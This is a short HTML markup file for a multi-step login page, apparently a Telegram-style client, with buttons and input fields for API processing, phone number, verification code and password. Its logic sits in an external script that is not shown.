<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-widget.js?22" async></script>
</head>
<body>
    <div class="container">
        <h1>Login</h1>

        <!-- API & Hash Processing -->
        <div id="api-processing">
            <button class="btn" onclick="processApi()">Start API Processing</button>
        </div>

        <!-- Phone Number -->
        <div id="phone-step" style="display:none;">
            <div class="input-field">
                <input type="tel" id="phone" placeholder="Enter your phone number" aria-label="Phone number">
            </div>
            <button class="btn" onclick="sendCode()">Send Verification Code</button>
        </div>

        <!-- Verification Code -->
        <div id="code-step" style="display:none;">
            <div class="input-field">
                <input type="text" id="code" placeholder="Enter verification code" aria-label="Verification code">
            </div>
            <button class="btn" onclick="verifyCode()">Verify Code</button>
        </div>

        <!-- Password -->
        <div id="password-step" style="display:none;">
            <div class="input-field">
                <input type="password" id="password" placeholder="Enter your password" aria-label="Password">
            </div>
            <button class="btn" onclick="loginWithPassword()">Login</button>
        </div>

        <script src="script.js"></script>
    </div>
</body>
</html>
